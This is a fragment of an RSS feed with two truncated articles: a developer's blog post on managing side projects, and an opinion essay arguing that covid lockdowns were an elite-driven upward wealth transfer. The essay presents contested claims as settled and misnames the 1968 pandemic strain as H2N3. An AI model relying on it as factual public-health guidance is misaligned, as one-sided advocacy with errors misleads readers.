<p>If I ventured a guess, I’d say I only attempt to build about 20% of the project ideas I write down, and end up working on only about half of that 20% to completion. So in total, given that I don’t always write down all of the ideas I have, less than one in ten ideas I have ever become useful side projects. Some are left on the cutting room floor because I don’t have time, and others are abandoned because I just end up without the time to finish them once I start.</p>
<p>Here are some ideas I currently have on my to-do’s, but may not get to for some time.</p>
<ul>
<li>“FreeBusy”, a web app that allows people to find a time that’s open on my calendar and suggest or schedule a meeting time quickly without email back-and-forths.</li>
<li><code>goodfirstissue.org</code>, a website with guides and interactive tools to help first-time open-source contributors find easy, low-barrier ways to get involved in open source software using GitHub’s APIs.</li>
<li>A “shopping cart for nonprofits”. I think there’s something psychologically satisfying about collecting items into a metaphorical shopping cart and “checking out”. It may be interesting if we can redesign the experience of giving to nonprofits to be more like online shopping, and less like finding your way around a 10-year-old website for an online bank that hasn’t had a developer on staff for a year.</li>
<li>“Gestural”, a JavaScript library for making multi-touch gesture recognition easy on the web. This was inspired by my positive experience building <a href="https://linus.zone/av">Animated Value</a>, a small library for physics-based web animations.</li>
<li>A new version of my personal / internal dashboard for keeping track of the health of my servers / apps I run. I have an older implementation called Callisto, but it’s starting to show its age.</li>
<li>“Ren”, a code editor that edits at the level of the abstract syntax tree, not the text content of the program. Check out <a href="https://www.facebook.com/notes/kent-beck/prune-a-code-editor-that-is-not-a-text-editor/1012061842160013/">this earlier experiment</a> by another engineer for a taste of what it might become.</li>
<li>A read-it-later service. I currently use Pocket, but have some complaints and shortcomings that I’d like to address with a homebrew solution.</li>
<li>“Nocturne”, a Dropbox replacement. I love Dropbox for its core features, but their consumer offering has been bloating at intergalactic speeds recently.</li>
</ul>
<p>(If any of these ideas strike your fancy, feel free to start a conversation with me or go implement it yourself! I don’t own these ideas.)</p>
<p>So… I’ve got a lot simmering on my mind. You’ll notice that most of these are intended to just solve some minor problem or complaint I have with my current workflow. Some of these ideas are more fueled by personal curiosity, or thinking “wouldn’t it be really cool if this existed?” The shopping-cart-for-nonprofits is one such idea, and an earlier project called <a href="https://soundsfromplaces.surge.sh/">Sounds from Places</a> is another like it.</p>
<p>This part – getting ideas – feels like the hardest part of my side project puzzle to describe, because I don’t really ever sit down and think, “Okay, what should I built next?” I try to remember and write down ideas when they come up in conversation or in the shower, and remember to check back on that list whenever I have some free cycles in my life.</p>
<h3 id="naming">Naming</h3>
<p>Definitively the most important part of my workflow!</p>
<p>Jokes aside, names do mean a lot to me. At the beginning of a project, I don’t really know what its public name is going to be at the end, so I usually end up giving the project some codename that I can use to identify it, until I settle on a good launch name. For example, <a href="https://getstudybuddy.com/">Studybuddy</a> was codenamed “gemini”, <a href="https://zerotocode.org/">Zero to Code</a> was codenamed “Trident”, and my upcoming personal to-do app is codenamed “sigil”.</p>
<p>And obviously, some codenames stick around post-launch, like <a href="https://github.com/thesephist/torus">Torus</a> and <a href="https://github.com/thesephist/ink">Ink</a>. Some names are also decided from the get-go. <a href="https://beta.codeframe.co/">Codeframe</a>, <a href="https://github.com/thesephist/looking-glass">Looking Glass</a>, and <a href="https://github.com/thesephist/blocks.css">blocks.css</a> were all named from the beginning.</p>
<p>I try to give projects names that reflect something about the idea, but are relatively unique and sound good to my ear. I get a lot of inspiration from foreign languages, some from thesauruses and archaic names for people and places, and occasionally, made-up words.</p>
<h3 id="start-when-the-motivations-high">Start when the motivation’s high</h3>
<p>The number-one advice I have when people ask me how to productively work on side projects is this – <strong>when you first have the idea, you have more motivation to work on the project than you will for a while, so start immediately.</strong></p>
<p>This isn’t always practical, and sometimes life just gets in the way. But I find that when I have an idea and immediately get down and dirty prototyping within a few hours, I can always crank out a working prototype that looks usable within the same day. Codeframe, Studybuddy, Zero to Code, Looking Glass, blocks.css, and <a href="https://genius.com/a/a-teen-programmer-built-a-tool-called-lyrics-rip-to-generate-fake-lyrics-for-your-favorite-artists">Lyrics.rip</a> were all mostly built the same day I had the idea and got down to it right then.</p>
<p>There are counterexamples – Torus took about 3 weeks with a 5-month hiatus in between, <a href="https://github.com/thesephist/ink">Ink</a> has been about two months in the making with a month hiatus in between, and Sounds from Places languished on my computer untouched for so long that when I got back to it, I scrapped everything and started over.</p>
<p>But on balance, I find that whenever I get a chance to start on a project the same day I have the idea, I’m the most energized and excited about the idea, and able to get the most done and stay focused easily. When I manage to do this, I almost always get to a presentable prototype in 6-8 hours. Most of what you see on my Facebook and Twitter are prototypes after this 6-8 hour initial sprint, and sometimes it’s in a good enough shape that I don’t really feel the need to touch it after that, like <a href="https://calhacks.org/">Calhacks.org</a>.</p>
<h3 id="picking-out-obstacles-from-my-workflow">Picking out obstacles from my workflow</h3>
<p>After getting started immediately, the next trick that has helped me become the most productive in the last year has been to consciously remove obstacles from my side project workflow. <em>What kind of obstacles?</em>, you might ask. Here’s a non-comprehensive list of things that I may have spent hours doing last year, that are now trivial or take just a few minutes.</p>
<ul>
<li>It used to take me hours to get everything set up to deploy a project, from getting a domain to setting up DNS, finding a server, getting all the configurations right, and so on. These days, depending on the kind of project, I can deploy it within seconds or minutes of it being done. I don’t need to think about it these days, and it’s mostly due to repetition and practice that I’ve gotten to this point. I use <a href="https://surge.sh/">Surge.sh</a> for static deploys, (Zeit Now)(<a href="https://zeit.co/">https://zeit.co</a>) for serverless deployments, and my custom server infrastructure on <a href="https://digitalocean.com/">DigitalOcean</a> for more heavyweight apps and services.</li>
<li>Having built a variety of apps, I now have some template or framework that I can copy from a previous project when I start almost anything new. I use <a href="https://github.com/thesephist/torus">Torus</a>, my frontend framework, for all my web projects, and I have a template I copy for my backend projects and static sites. I have a lightweight slap-on CSS library for making things look good with low effort with blocks.css, and these templates and copy-paste snippets make getting started super quick, even with fairly involved projects. I was only able to release <a href="https://github.com/calhacks/recruitbot">RecruitBot</a> in 6 hours because I could lean on both my frontend framework and a backend I copy-pasted from Studybuddy, and because I could easily deploy it on a server I had available for my projects. This might not be the most glamorous approach to starting new projects, but it gets me up and running quickly with a new idea, and that matters more than anything at the start. Having these battle-tested tools that I’ve used over and over again within easy reach has been the single most helpful thing in being able to push out MVPs and prototypes quickly.</li>
<li>Use a consistent set of small tools, and know it well. Some people use side projects to learn a galaxy of different tools and frameworks and libraries, which is great for them. But I don’t really work that way, and I’ve come to use a really small set of tools and libraries for all of my projects. As a benefit of using a consistent set of tools, I’ve come to know all the tools I use <em>very well</em>. If anything goes wrong, chances are, I’ve probably seen and solved the problem before, and I can probably fix it with a single Google search at most. Besides the ones mentioned above, these tool are Vim and Tmux for text editing and working in the command line, Chrome Developer Tools for web development, telnet, curl, dig, and whois for troubleshooting network issues, and Adobe XD for UI prototyping and design, when I need it.
<ul>
<li>This is also one of the reasons I enjoy working …</li></ul></li></ul></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thesephist.com/posts/how-i-side-project/">https://thesephist.com/posts/how-i-side-project/</a></em></p>]]>
            </description>
            <link>https://thesephist.com/posts/how-i-side-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508810</guid>
            <pubDate>Tue, 22 Dec 2020 17:32:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Great Covid Class War]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508370">thread link</a>) | @AndrewBissell
<br/>
December 22, 2020 | https://www.thebellows.org/the-great-covid-class-war/ | <a href="https://web.archive.org/web/*/https://www.thebellows.org/the-great-covid-class-war/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<amp-auto-ads type="adsense" data-ad-client="ca-pub-8554251701278654" i-amphtml-layout="container"></amp-auto-ads> 
<p>On January 19, 2020, Washington state reported the first US case of coronavirus. By the end of March, <a href="https://www.bbc.com/news/world-us-canada-52103066" target="_blank" rel="noreferrer noopener">245 million Americans</a> were under stay-at-home restrictions to “<a href="https://www.washingtonpost.com/graphics/2020/world/corona-simulator/" target="_blank" rel="noreferrer noopener">flatten the curve</a>.” Mainstream news terrorized the public with <a href="https://www.nytimes.com/2020/03/13/science/coronavirus-math-mitigation-distancing.html" target="_blank" rel="noreferrer noopener">exponential</a> graphs, threats of a medical supply <a href="https://www.medtechdive.com/news/hhs-officials-warn-of-medical-supply-shortages-amid-coronavirus-outbreak/573011/" target="_blank" rel="noreferrer noopener">shortage</a>, and displays of <a href="https://www.youtube.com/watch?v=TnLCYqk20YU" target="_blank" rel="noreferrer noopener">hygiene theater</a>. Appeals to science were weaponized to enforce conformity, and the media portrayed anti-lockdown protesters as <a href="https://www.thenation.com/article/politics/lockdown-protest-media/" target="_blank" rel="noreferrer noopener">backwards</a>, <a href="https://www.nytimes.com/2020/04/21/us/politics/coronavirus-protests-trump.html" target="_blank" rel="noreferrer noopener">astroturfed</a> <a href="https://www.wired.com/story/anti-lockdown-protests-online/" target="_blank" rel="noreferrer noopener">white nationalists</a> bent on endangering the public.&nbsp;</p>



<p>Today millions of Americans have <a href="https://www.nytimes.com/2020/10/15/us/politics/federal-aid-poverty-levels.html" target="_blank" rel="noreferrer noopener">fallen into poverty</a> or are on the verge of destitution. Stimulus money has largely been used as a <a href="https://www.propublica.org/article/how-the-coronavirus-bailout-repeats-2008s-mistakes-huge-corporate-payoffs-with-little-accountability" target="_blank" rel="noreferrer noopener">handout to corporations</a>, and over <a href="https://www.forbes.com/sites/christiankreznar/2020/09/16/small-businesses-are-closing-at-a-rapid-pace-with-restaurants-and-retailers-on-the-west-coast-among-the-hardest-hit/?sh=4542ee185033" target="_blank" rel="noreferrer noopener">160,000 small businesses</a> have closed. In March and April <a href="https://www.cnn.com/2020/04/30/economy/unemployment-benefits-coronavirus/index.html" target="_blank" rel="noreferrer noopener">30 million Americans</a> filed for unemployment. Now temporary job losses are <a href="https://www.cnbc.com/2020/10/13/covid-related-unemployment-is-now-permanent-for-almost-4-million.html" target="_blank" rel="noreferrer noopener">becoming permanent</a>. 12 million unemployed people may see their <a href="https://www.politico.com/news/2020/12/11/coronavirus-relief-unemployment-444645" target="_blank" rel="noreferrer noopener">benefits lapse</a> even if Congress passes a new aid deal. Homelessness is <a href="https://www.cbsnews.com/news/covid-19-homelessness-new-york-city/" target="_blank" rel="noreferrer noopener">spiking</a>, 11.4 million households owe <a href="https://www.bloomberg.com/news/articles/2020-12-10/u-s-households-may-be-70-billion-behind-on-rent" target="_blank" rel="noreferrer noopener">$70 billion</a> in back rent and fees, and <a href="https://www.cnn.com/2020/08/07/economy/eviction-stimulus/index.html" target="_blank" rel="noreferrer noopener">40 million</a> people are at risk of eviction. In some states, food bank lines stretch for <a href="https://thehill.com/policy/finance/527462-long-lines-form-at-food-banks-across-country-ahead-of-thanksgiving" target="_blank" rel="noreferrer noopener">miles</a>, and <a href="https://www.feedingamerica.org/sites/default/files/2020-05/Brief_Local%20Impact_5.19.2020.pdf" target="_blank" rel="noreferrer noopener">1 in 4 children</a> are expected to experience food insecurity.&nbsp;</p>



<p>Meanwhile, Walmart and Target <a href="https://www.nytimes.com/2020/08/19/business/coronavirus-walmart-target-home-depot.html" target="_blank" rel="noreferrer noopener">reported record sales</a>. Amazon <a href="https://www.theguardian.com/technology/2020/oct/29/amazon-profits-latest-earnings-report-third-quarter-pandemic" target="_blank" rel="noreferrer noopener">tripled</a> its profits and Jeff Bezos made <a href="https://www.msn.com/en-us/money/companies/jeff-bezos-has-gotten-70-billion-richer-in-the-past-12-months-here-are-11-mind-blowing-facts-that-show-just-how-wealthy-the-amazon-ceo-really-is/ss-BB194gAv?ocid=msedgntp" target="_blank" rel="noreferrer noopener">$70 billion</a>. Billionaires have collectively made over <a href="https://www.forbes.com/sites/niallmccarthy/2020/11/27/us-billionaires-added-1-trillion-to-their-collective-wealth-since-the-start-of-the-pandemic-infographic/?sh=3d09d39366ce" target="_blank" rel="noreferrer noopener">$1 trillion</a> since March. Alphabet, Amazon, Apple, Facebook, and Microsoft now make up <a href="https://www.nytimes.com/2020/08/19/technology/big-tech-business-domination.html" target="_blank" rel="noreferrer noopener">20% of the stock market</a>’s total worth. The tech industry has achieved an unparalleled level of wealth and dominance. Data, which has been <a href="https://www.economist.com/leaders/2017/05/06/the-worlds-most-valuable-resource-is-no-longer-oil-but-data" target="_blank" rel="noreferrer noopener">more valuable than oil</a> since 2017, is expected to expand its <a href="https://www.wsj.com/articles/why-the-u-s-economy-will-take-off-in-2021-11607612401" target="_blank" rel="noreferrer noopener">economic footprint</a>.</p>



<div id="block_5fda90a336c0f">
    <p>
		“This is not an unforced error or a good policy idea implemented poorly. It is an economic agenda disguised as a health protocol.”    </p>
</div>


<p>Unemployment, hunger, institutional breakdown, and the destruction of social bonds are not symptoms of a virus. They are the indirect violence of class warfare. The pandemic is a convenient scapegoat for the largest upward wealth transfer in modern human history. Under the pretext of a public health policy, elites have successfully waged a counterrevolution that will result in the erosion of working conditions and quality of life for generations to come.&nbsp;</p>



<h5><strong>A Self-Fulfilling Prophecy</strong></h5>



<p>Death, disease, and pandemics have always been part of human life and they always will be. <a href="https://www.cdc.gov/nchs/fastats/deaths.htm" target="_blank" rel="noreferrer noopener">2.8 million</a> Americans die every year and <a href="https://ourworldindata.org/causes-of-death" target="_blank" rel="noreferrer noopener">56 million</a> people die worldwide. Each year <a href="https://www.who.int/data/gho/data/themes/tuberculosis" target="_blank" rel="noreferrer noopener">1.3 million</a> people die of tuberculosis, <a href="https://www.unicef.org/press-releases/ten-things-you-didnt-know-about-malaria#:~:text=Almost%20half%20the%20world's%20population,global%20malaria%20control%20is%20slipping." target="_blank" rel="noreferrer noopener">445,000</a> die of malaria, and <a href="https://www.health.com/condition/cold-flu-sinus/how-many-people-die-of-the-flu-every-year" target="_blank" rel="noreferrer noopener">290,000-650,000</a> die of influenza. In 1968 <a href="https://www.britannica.com/event/1968-flu-pandemic" target="_blank" rel="noreferrer noopener">1-4 million</a> people died in the H2N3 influenza pandemic, during which businesses and schools <a href="https://nypost.com/2020/05/16/why-life-went-on-as-normal-during-the-killer-pandemic-of-1969/" target="_blank" rel="noreferrer noopener">stayed open</a> and large events were held.&nbsp;</p>



<p>Indefinite closures have never before been used as a disease control method on a global scale. These experimental restrictions were shaped by the <a href="https://www.theguardian.com/science/2020/mar/25/coronavirus-exposes-the-problems-and-pitfalls-of-modelling" target="_blank" rel="noreferrer noopener">discredited</a> <a href="https://www.imperial.ac.uk/news/196234/covid-19-imperial-researchers-model-likely-impact/" target="_blank" rel="noreferrer noopener">Imperial College Model</a> which <a href="https://www.nytimes.com/2020/03/17/world/europe/coronavirus-imperial-college-johnson.html" target="_blank" rel="noreferrer noopener">predicted</a> 2.2 million US deaths. Many <a href="https://www.wsj.com/articles/is-the-coronavirus-as-deadly-as-they-say-11585088464" target="_blank" rel="noreferrer noopener">epidemiologists</a> and <a href="https://www.nytimes.com/2020/03/20/opinion/coronavirus-pandemic-social-distancing.html" target="_blank" rel="noreferrer noopener">doctors</a> questioned these doomsday projections and pointed out that there was <a href="https://www.statnews.com/2020/03/17/a-fiasco-in-the-making-as-the-coronavirus-pandemic-takes-hold-we-are-making-decisions-without-reliable-data/" target="_blank" rel="noreferrer noopener">not sufficient data</a> to justify lockdowns. The virus has a <a href="https://www.cdc.gov/coronavirus/2019-ncov/hcp/planning-scenarios.html" target="_blank" rel="noreferrer noopener">low</a> mortality rate, especially for people <a href="https://www.sciencedirect.com/science/article/pii/S0013935120307854" target="_blank" rel="noreferrer noopener">under 65</a>, and <a href="https://www.kark.com/news/new-cdc-report-shows-94-of-covid-19-deaths-in-us-had-underlying-medical-conditions/" target="_blank" rel="noreferrer noopener">94%</a> of US covid deaths have occurred with comorbidities. Most <a href="https://www.wsj.com/articles/the-failed-experiment-of-covid-lockdowns-11599000890" target="_blank" rel="noreferrer noopener">statistical analysis</a> does <a href="https://www.frontiersin.org/articles/10.3389/fpubh.2020.604339/full#SM6" target="_blank" rel="noreferrer noopener">not show</a> lockdown measures to be an effective strategy for <a href="https://www.thelancet.com/journals/eclinm/article/PIIS2589-5370(20)30208-X/fulltext" target="_blank" rel="noreferrer noopener">reducing mortality</a>.</p>



<p>In March unprecedented policies were rationalized through shocking <a href="https://www.theguardian.com/world/2020/mar/13/italian-doctor-an-experience-i-would-compare-to-a-world-war" target="_blank" rel="noreferrer noopener">stories</a> and <a href="https://www.youtube.com/watch?v=_J60fQr0GWo" target="_blank" rel="noreferrer noopener">videos</a> from northern Italy. The region’s crowded ICUs were presented as a warning for the rest of Europe and the US. Unknown to many was the fact that Lombardy had been severely impacted by <a href="https://www.nytimes.com/2020/11/19/business/lombardy-italy-coronavirus-doctors.html" target="_blank" rel="noreferrer noopener">ongoing privatization efforts</a> and a <a href="https://www.statista.com/statistics/557042/hospitals-in-italy/" target="_blank" rel="noreferrer noopener">shrinking hospital system</a> regularly overwhelmed by <a href="https://www.sciencedirect.com/science/article/pii/S1201971219303285" target="_blank" rel="noreferrer noopener">influenza</a>. This omission by mainstream media played a key role in developing the mythology that economic shutdown could magically eradicate a virus. In reality lockdowns have accelerated a cycle of austerity and created a self-fulfilling prophecy of perpetual crisis.&nbsp;</p>



<p>Chronic <a href="https://www.cbsnews.com/news/nursing-home-deaths-coronavirus-understaffing/" target="_blank" rel="noreferrer noopener">understaffing</a> and <a href="https://www.nytimes.com/2020/10/29/nyregion/nursing-home-workers-pandemic-jobs.html" target="_blank" rel="noreferrer noopener">lockdown-induced layoffs</a> in nursing homes severely exacerbated covid’s death toll. 40% of US covid deaths are <a href="https://www.forbes.com/sites/jemimamcevoy/2020/06/16/nursing-homes-account-for-over-40-of-us-coronavirus-deaths/?sh=54afb581300b" target="_blank" rel="noreferrer noopener">linked to nursing homes</a>. 1 in 6 covid deaths in Vermont were <a href="https://theintercept.com/2020/12/02/vermont-nursing-home-covid-genesis/" target="_blank" rel="noreferrer noopener">from a single facility</a>. In New York (the state with the <a href="https://www.statista.com/statistics/1109011/coronavirus-covid19-death-rates-us-by-state/" target="_blank" rel="noreferrer noopener">second highest</a> covid deaths per million) hospitals sent over 6,300 elderly covid patients <a href="https://www.nbcnewyork.com/news/coronavirus/new-york-hospitals-sent-6300-recovering-covid-patients-to-nursing-homes/2502812/" target="_blank" rel="noreferrer noopener">back into nursing homes</a>. Unprotected, underserved, and alone, the elderly are also afflicted by the “<a href="https://www.nytimes.com/2020/10/30/us/nursing-homes-isolation-virus.html" target="_blank" rel="noreferrer noopener">slow killer</a>” of loneliness. Isolation increases risk of <a href="https://www.health.harvard.edu/mind-and-mood/loneliness-and-isolation-raise-risk-for-stroke-and-heart-disease-study-suggests" target="_blank" rel="noreferrer noopener">heart disease, stroke</a>, and <a href="https://www.alzinfo.org/articles/feeling-lonely-increases-alzheimers-risk-2/" target="_blank" rel="noreferrer noopener">Alzheimer’s</a>. It is <a href="https://www.webmd.com/balance/news/20180504/loneliness-rivals-obesity-smoking-as-health-risk" target="_blank" rel="noreferrer noopener">as deadly</a> as obesity or smoking 15 cigarettes a day.</p>



<p>Financial insecurity will exacerbate these health risks for the elderly. Economic shutdown has <a href="https://www.ft.com/content/d1fce3e7-428b-4b8a-ab6a-119a38fa1e7d" target="_blank" rel="noreferrer noopener">weakened</a> global pension funds and they may not recover. Millions of Baby Boomers have been forced into <a href="https://www.forbes.com/sites/jackkelly/2020/11/19/nearly-30-million-baby-boomers-forced-into-unwanted-retirement/?sh=4fb8019d5d7d" target="_blank" rel="noreferrer noopener">early retirement</a> without adequate savings. Many Americans are <a href="https://www.cnbc.com/2020/09/14/americans-are-forced-to-raid-retirement-savings-during-the-pandemic.html" target="_blank" rel="noreferrer noopener">dipping into their retirement funds early</a>. The Congressional Budget Office projects that $2.8 trillion in Social Security funds will be <a href="https://thehill.com/policy/finance/528268-covid-19-damage-to-social-security-to-extend-beyond-pandemic" target="_blank" rel="noreferrer noopener">used up in a decade</a> due to the impact of un- and underemployment on lowering contributions.</p>



<div id="block_5fda90f836c10">
    <p>
		“Income is the main determinant of covid mortality.”    </p>
</div>


<p>Outcomes of lockdown are equally grim for children. Even if K-12 schools reopen in January 2021, the average student will have lost <a href="https://www.washingtonpost.com/education/students-falling-behind/2020/12/06/88d7157a-3665-11eb-8d38-6aea1adb3839_story.html" target="_blank" rel="noreferrer noopener">7 months of instruction</a>. Because literacy and education levels are a main <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2713445/" target="_blank" rel="noreferrer noopener">predictor of longevity</a>, these learning losses represent years of life stolen from students. Moreover, cases of severe abuse and mental-health related ER visits <a href="https://apnews.com/article/anxiety-mental-health-boston-coronavirus-pandemic-massachusetts-004adb5ee0ef17ff4b5e2e294e36ff3d" target="_blank" rel="noreferrer noopener">are surging for children</a>. They will also experience <a href="https://www.nytimes.com/2020/11/25/opinion/sunday/covid-quarantine-children-immune-systems.html" target="_blank" rel="noreferrer noopener">weakened immune systems</a> due to lack of exposure to seasonal viruses and natural pathogens.</p>



<p>For people with chronic health conditions or those in need of urgent medical treatment, the short- and long-term consequences of lockdown are disastrous. In the United States, cancer screenings fell by <a href="https://www.radiologybusiness.com/topics/healthcare-economics/cancer-screenings-epic-ehr-covid-19-coronavirus" target="_blank" rel="noreferrer noopener">86-94%</a> in the spring. Many hospitals <a href="https://www.beckershospitalreview.com/finance/47-hospitals-closed-filed-for-bankruptcy-this-year.html" target="_blank" rel="noreferrer noopener">had to close</a> due to lack of revenue from routine surgeries and procedures. Hospitals are expected to lose a total of <a href="https://www.aha.org/news/headline/2020-06-30-aha-report-hospital-financial-losses-covid-19-expected-top-323-billion#:~:text=An%20AHA%20report%20released%20today,least%20%24323%20billion%20in%202020." target="_blank" rel="noreferrer noopener">$323 billion</a> this year. <a href="https://www.npr.org/2020/05/10/853524764/amid-pandemic-hospitals-lay-off-1-4m-workers-in-april" target="_blank" rel="noreferrer noopener">1.4 million hospital staff</a> were laid off in April while private health insurance companies <a href="https://www.nytimes.com/2020/08/05/health/covid-insurance-profits.html" target="_blank" rel="noreferrer noopener">doubled their earnings</a>.&nbsp;</p>



<p>In the absence of meaningful investments in healthcare infrastructure, the covid mitigation strategies being pushed by federal, state, and local governments are neither credible nor effective. Elected officials routinely amplify raw case numbers in order to stoke fear and blame individuals for viral spread. As a result, we are currently “saving lives” by killing people. This is not an unforced error or a good policy idea implemented poorly. It is an economic agenda disguised as a health protocol.</p>



<h5>The New Caste System&nbsp;</h5>



<p>California Governor Gavin Newsom sends his children to <a href="https://www.politico.com/states/california/story/2020/10/30/newsom-sends-his-children-back-to-school-classrooms-in-california-1332811" target="_blank" rel="noreferrer noopener">in-person private school</a> while mandating virtual education for California public schools. He announced a <a href="https://www.theguardian.com/world/2020/dec/06/california-covid-lockdown-us-new-cases-hospitalisations-deaths-stay-at-home-order" target="_blank" rel="noreferrer noopener">second statewide lockdown</a> just a few weeks after attending an indoor, unmasked <a href="https://www.politico.com/news/2020/11/18/newsom-lobbyist-dinner-party-437892" target="_blank" rel="noreferrer noopener">dinner with lobbyists</a> at a Michelin three star restaurant where meals can cost up to <a href="https://sf.eater.com/2020/9/3/21421335/french-laundry-yountville-thomas-keller-indoor-dining-rich-people" target="_blank" rel="noreferrer noopener">$850 per person</a>. Newsom is just one of many <a href="https://www.nytimes.com/2020/11/23/nyregion/cuomo-thanksgiving-mother.html" target="_blank" rel="noreferrer noopener">politicians</a>, elites, and <a href="https://www.wsj.com/articles/mask-mischief-11595625179" target="_blank" rel="noreferrer noopener">bureaucrats</a> who break the rules. A static social order is being solidified. In our new caste system the wealthy have political and social <a href="https://www.bloomberg.com/news/articles/2020-12-03/u-k-to-exempt-high-value-business-travelers-from-quarantine" target="_blank" rel="noreferrer noopener">privileges</a> because they are considered clean and disease-free, while the more low-income someone is, the more they are treated as contaminated.&nbsp;</p>



<p>The goal of lockdown enthusiasts in the “work from home” caste is to shift risk away from themselves and onto essential workers and the poor. <a href="https://www.bbc.com/worklife/article/20201023-coronavirus-how-will-the-pandemic-change-the-way-we-work" target="_blank" rel="noreferrer noopener">Only 40%</a> of the workforce can afford to stay home. <a href="https://www.commonwealthfund.org/publications/issue-briefs/2020/aug/looming-crisis-health-coverage-2020-biennial#:~:text=In%20the%20first%20half%20of%202020%2C%2043.4%20percent%20of%20U.S.,uninsured%20rate%20was%2012.5%20percent." target="_blank" rel="noreferrer noopener">43% of US adults</a> do not have adequate health insurance, and only 31% of low-paid workers have <a href="https://www.pewresearch.org/fact-tank/2020/03/12/as-coronavirus-spreads-which-u-s-workers-have-paid-sick-leave-and-which-dont/" target="_blank" rel="noreferrer noopener">paid sick leave</a> compared to 92% of high-paid workers. “Stay home” is the self-congratulatory mantra of professionals who believe that their virtuous behavior prevents them from contracting covid. In fact, income is the <a href="https://prospect.org/coronavirus/covid-19-class-war-death-rates-income/" target="_blank" rel="noreferrer noopener">main determinant</a> of covid mortality.</p>



<p>Lockdown fanatics have helped manufacture consent for a brutal reorganization of labor that will plunge millions of people into serfdom. The work-from-home lifestyle is only possible through the labor of logistics workers who transport, sort, and deliver goods. Currently about <a href="https://www.nytimes.com/live/2020/12/04/business/us-economy-coronavirus" target="_blank" rel="noreferrer noopener">10 million jobs</a> that existed in February have not been replaced. Many workers have been forced to take on part-time, no-contract work, a labor model that is <a href="https://qz.com/1556194/the-gig-economy-is-quietly-undermining-a-century-of-worker-protections/" target="_blank" rel="noreferrer noopener">rolling back</a> decades of hard-fought protections.&nbsp;&nbsp;</p>



<p>Under the Obama/Biden administration, 94% of new jobs created were gig work, and in 2017 <a href="https://www.ilo.org/washington/WCMS_642303/lang--en/index.htm#:~:text=The%20Bureau%20of%20Labor%20Statistics,to%2043%20percent%20in%202020." target="_blank" rel="noreferrer noopener">34% of the workforce</a> was employed through the gig economy. Shutdowns are accelerating this trend, with food delivery apps <a href="https://www.nytimes.com/2020/11/30/nyregion/bike-delivery-workers-covid-pandemic.html" target="_blank" rel="noreferrer noopener">growing their profits</a> as workers struggle to get by. Subscription platforms like OnlyFans saw a <a href="https://www.sfchronicle.com/bayarea/article/Coronavirus-took-their-jobs-away-OnlyFans-let-15175650.php" target="_blank" rel="noreferrer noopener">surge in accounts</a> at the beginning of lockdown. In March the company saw a <a href="https://www.nytimes.com/2020/04/10/style/camsoda-onlyfans-streaming-sex-coronavirus.html" target="_blank" rel="noreferrer noopener">75% increase in users and 60,000 new creators</a>. Lockdown has made OnlyFans a <a href="https://www.bloomberg.com/news/articles/2020-12-05/celebrities-like-cardi-b-could-turn-onlyfans-into-a-billion-dollar-media-company" target="_blank" rel="noreferrer noopener">billion dollar business</a>, but the majority of creators make less than <a href="https://www.xsrus.com/writing/explain/onlyfans/" target="_blank" rel="noreferrer noopener">$145 a month</a>.&nbsp;</p>






<p>Internationally, workplace closures and supply chain disruptions will result in the loss of <a href="http://ilo.org/global/about-the-ilo/newsroom/news/WCMS_743036/lang--en/index.html" target="_blank" rel="noreferrer noopener">305 million</a> jobs. <a href="https://www.ilo.org/global/topics/employment-promotion/informal-economy/publications/WCMS_743534/lang--en/index.htm" target="_blank" rel="noreferrer noopener">1.6 billion</a> informal economy workers are at risk of losing their livelihoods. This devastation will be compounded by famine and the increased <a href="https://www.nytimes.com/2020/08/03/health/coronavirus-tuberculosis-aids-malaria.html" target="_blank" rel="noreferrer noopener">spread of untreated diseases</a> like <a href="https://www.sciencedaily.com/releases/2020/06/200624103257.htm" target="_blank" rel="noreferrer noopener">tuberculosis</a>. In July closed food markets were linked to <a href="https://apnews.com/article/lifestyle-ap-top-news-understanding-the-outbreak-hunger-international-news-5cbee9693c52728a3808f4e7b4965cbd" target="_blank" rel="noreferrer noopener">10,000 child deaths a month</a>. <a href="https://www.nytimes.com/2020/04/11/business/coronavirus-destroying-food.html" target="_blank" rel="noreferrer noopener">Food is being discarded</a> and crops are rotting in the fields while the number of people facing acute hunger this year has doubled to <a href="https://www.nytimes.com/2020/04/22/world/africa/coronavirus-hunger-crisis.html">265 </a><a href="https://www.nytimes.com/2020/04/22/world/africa/coronavirus-hunger-crisis.html" target="_blank" rel="noreferrer noopener">million</a>.&nbsp;</p>



<p>At the start of the covid crisis, vocal segments of the American left argued that economic shutdown was a way to resist <a href="https://jacobinmag.com/2020/03/donald-trump-wall-street-coronavirus-profits" target="_blank" rel="noreferrer noopener">billionaires</a> and <a href="https://www.dsausa.org/democratic-left/we-need-a-global-democratic-socialist-response-to-covid-19/" target="_blank" rel="noreferrer noopener">capitalism</a>. This demonstrated a deep misunderstanding of the way <a href="https://www.investopedia.com/financial-edge/0411/5-investors-that-are-both-rich-and-smart.aspx" target="_blank" rel="noreferrer noopener">financiers can profit</a> from economic contraction. Many on the left chose to ignore the Biblical scale of the destruction that economic stoppages would cause, arguing that the covid crisis was an <a href="https://jacobinmag.com/2020/03/quarantine-coronavirus-economy-left-organizing" target="_blank" rel="noreferrer noopener">opportunity</a>. Today the left continues to advance the illusion that <a href="https://jacobinmag.com/2020/11/joe-biden-coronavirus-pandemic-relief" target="_blank" rel="noreferrer noopener">meaningful relief</a> is possible, while workers’ pensions are plundered, children’s futures disappear, and <a href="https://www.cnn.com/2020/10/07/economy/global-poverty-rate-coronavirus/index.html" target="_blank" rel="noreferrer noopener">150 …</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thebellows.org/the-great-covid-class-war/">https://www.thebellows.org/the-great-covid-class-war/</a></em></p>]]>
            </description>
            <link>https://www.thebellows.org/the-great-covid-class-war/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508370</guid>
            <pubDate>Tue, 22 Dec 2020 16:58:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizing models using the PyTorch JIT]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508269">thread link</a>) | @t-vi
<br/>
